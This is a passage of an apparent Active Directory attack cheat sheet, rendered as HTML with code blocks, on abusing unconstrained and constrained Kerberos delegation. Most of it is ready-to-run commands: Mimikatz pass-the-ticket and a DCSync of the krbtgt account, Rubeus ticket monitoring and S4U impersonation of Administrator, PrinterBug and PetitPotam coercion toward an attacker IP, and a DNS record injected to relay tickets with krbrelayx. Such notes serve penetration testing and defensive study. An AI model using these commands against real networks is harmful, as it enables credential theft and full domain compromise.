</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 405px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 405.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"kerberos::ptt ticket.kirbi"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-printer-bug-%2F-petitp">Printer bug / PetitPotam</h4>
<p id="bkmrk-to-force-another-com">To force another computer to connect to the compromised machine in UD, and capture the TGT by monitoring:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 296.524px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">monitor</span> <span class="cm-operator">/</span><span class="cm-identifier">interval</span><span class="cm-operator">:</span><span class="cm-number">5</span> <span class="cm-operator">/</span><span class="cm-identifier">nowrap</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-on-the-attacker-mach">On the attacker machine run :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 535px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 535.381px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PrinterBug</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">MS-RPRN</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-punctuation">\\</span><span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-punctuation">\\</span><span class="cm-identifier">unconstrainedMachine</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PetitPotam</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">PetitPotam</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">attacker_ip</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 470px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 98px; min-width: 470.238px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">ptt</span> <span class="cm-operator">/</span><span class="cm-identifier">ticket</span><span class="cm-operator">:..</span><span class="cm-punctuation">.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#DCSync with the dc TGT</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::dcsync /user:domain\krbtgt"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 98px;"></div><div class="CodeMirror-gutters" style="height: 148px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-any-principal-in-unc">Any principal in Unconstrained Delegation</h4>
<p id="bkmrk-if-we-have-enough-ri">If we have enough rights against a principal (computer or user) in UD to add a <strong>SPN</strong> on it and <strong>know its password</strong>, we can try to use it to retrieve a machine account password from an authentication coercion.</p>
<ul id="bkmrk-add-a-new-dns-record"><li>Add a new DNS record on the domain that point to our IP</li>
<li>Add a SPN on the principal that point to the DNS record and change its password (will be usefull for the tool <code>krbrelayx.py</code> to extract the TGT from the ST)</li>
<li>Trigger the authentication and grab the ST (and TGT in it) on <strong>krbrelayx</strong> that is listenning for it</li>
</ul><p id="bkmrk-since-the-principal-">Since the principal is in <strong>Unconstrained Delegation</strong>, when the machine account will send the <strong>ST</strong> to the SPN it will automatically add a <strong>TGT</strong> in it, and because the SPN is pointing to us with the DNS record, we can retrieve the TGS, decipher the ciphered part with the user password (the SPN is setup on the user, so the TGS is ciphered with his password), and retrieve the TGT.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 709px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 250px; min-width: 709.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Add the SPN with the Microsoft module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-ADUser</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">principal_in_UD</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">ServicePrincipalName</span> <span class="cm-punctuation">@{</span><span class="cm-identifier">Add</span><span class="cm-operator">=</span><span class="cm-string">'HOST/test.domain.local'</span><span class="cm-punctuation">}</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create the DNS record</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-DNSUpdate</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSType</span> <span class="cm-identifier">A</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSName</span> <span class="cm-identifier">test</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSData</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">attacker_IP</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Realm</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Run krbrelayx with the hash of the password setup on the UD user</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">python3</span> <span class="cm-identifier">krbrelayx</span><span class="cm-punctuation">.</span><span class="cm-identifier">py</span> <span class="cm-operator">-</span><span class="cm-identifier">hashes</span> <span class="cm-operator">:</span><span class="cm-number">2</span><span class="cm-identifier">B576ACBE6BCFDA7294D6BD18041B8FE</span> <span class="cm-operator">-</span><span class="cm-identifier">dc-ip</span> <span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Trigger the coercion</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">PetitPotam</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">attacker_ip</span><span class="cm-operator">&gt;</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target_IP</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 250px;"></div><div class="CodeMirror-gutters" style="height: 300px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-constrained-delegati">Constrained Delegation</h3>
<p id="bkmrk-in-this-situation%2C-t">In this situation, the computer in delegation has a list of services where it can delegate an authentication. This is controlled by <code>msDS-AllowedToDelegateTo</code> attribute that contains a list of SPNs to which the user tokens can be forwarded. No ticket is stored in LSASS.</p>
<p id="bkmrk-to-impersonate-the-u">To impersonate the user, Service for User (S4U) extension is used which provides two extensions:</p>
<ul id="bkmrk-service-for-user-to-"><li>Service for User to Self (<strong>S4U2self</strong>) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the <strong>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</strong>  T2A4D UserAccountControl attribute.</li>
<li>Service for User to Proxy (<strong>S4U2proxy</strong>) - Allows a service to obtain a TGS to a second service on behalf of a user.</li>
</ul><h4 id="bkmrk-enumerate-principals">Enumerate principals with CD enabled</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 702px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 701.857px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Powerview</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainUser</span> <span class="cm-operator">-</span><span class="cm-identifier">TrustedToAuth</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainComputer</span> <span class="cm-operator">-</span><span class="cm-identifier">TrustedToAuth</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADObject</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-punctuation">{</span><span class="cm-identifier">msDS-AllowedToDelegateTo</span> <span class="cm-operator">-ne</span> <span class="cm-string">"</span><span class="cm-variable-2">$null</span><span class="cm-string">"</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">msDS-AllowedToDelegateTo</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-with-protocol-transi">With protocol transition</h4>
<p id="bkmrk-any-service-can-be-s">Any service can be specified on the target since it is not correctly checked. All the Rubeus commands can be performed with kekeo aswell.</p>
<ul id="bkmrk-request-a-ticket-for"><li>Request a ticket for multiple services on the target, for another user (S4U)</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 991px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 991.381px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">user1</span> <span class="cm-operator">/</span><span class="cm-identifier">rc4</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">hash</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">impersonateuser</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-string">"time/&lt;target&gt;.domain.local"</span> <span class="cm-operator">/</span><span class="cm-identifier">altservice</span><span class="cm-operator">:</span><span class="cm-identifier">ldap</span><span class="cm-punctuation">,</span><span class="cm-identifier">cifs</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
